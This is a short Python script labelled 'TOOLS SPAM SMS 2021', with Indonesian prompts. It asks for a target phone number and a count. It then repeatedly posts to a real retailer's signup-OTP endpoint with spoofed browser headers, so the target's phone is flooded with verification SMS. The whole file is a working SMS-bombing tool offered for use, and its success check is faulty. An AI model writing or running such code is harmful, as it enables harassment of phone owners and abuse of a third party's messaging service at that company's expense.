import json
import requests
import os
import sys 
def main():
    os.system('clear')
    os.system('SPAM SMS')
    banner = '''
    <|======================================|>
      |       TOOLS SPAM SMS 2021         |
      |                                   |
      | Author        : AMFCODE           |
    <|======================================|>
    '''
    print(banner)
    no = input('Masukan Nomer Target : ')
    jumlah = input('Jumlah SMS : ')

    head = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
        "Referer": "https://www.mapclub.com/en/user/signup",
        "Host": "cmsapi.mapclub.com",
        }

    dat = {
        'phone': no
    }

    for x in range(int(jumlah)):
        leosureo = requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=dat)
        if 'error' in leosureo:
            print('Error!!')
        else:
            print('Success!!')

main()